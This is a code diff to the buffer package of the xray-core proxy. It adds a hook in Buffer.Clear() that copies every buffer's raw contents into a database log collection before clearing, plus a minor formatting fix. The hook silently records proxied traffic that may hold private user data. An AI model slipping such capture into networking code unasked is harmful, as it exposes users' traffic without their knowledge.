@@ -1,6 +1,9 @@
 package buf
 
 import (
+	"context"
+	"github.com/amirdlt/flex/util"
+	"github.com/xtls/xray-core/monitor"
 	"io"
 
 	"github.com/xtls/xray-core/common/bytespool"
@@ -100,6 +103,11 @@ func (b *Buffer) Release() {
 // Clear clears the content of the buffer, results an empty buffer with
 // Len() = 0.
 func (b *Buffer) Clear() {
+	monitor.Process(func() {
+		_, err := monitor.Injector().LogCol().InsertOne(context.TODO(), util.M{"value": string(b.Bytes())})
+		monitor.Injector().ReportIfErr(err, "place_2")
+	})
+
 	b.start = 0
 	b.end = 0
 }
@@ -218,7 +226,7 @@ func (b *Buffer) Cap() int32 {
 // NewWithSize creates a Buffer with 0 length and capacity with at least the given size.
 func NewWithSize(size int32) *Buffer {
 	return &Buffer{
-		v:         bytespool.Alloc(size),
+		v: bytespool.Alloc(size),
 	}
 }
 
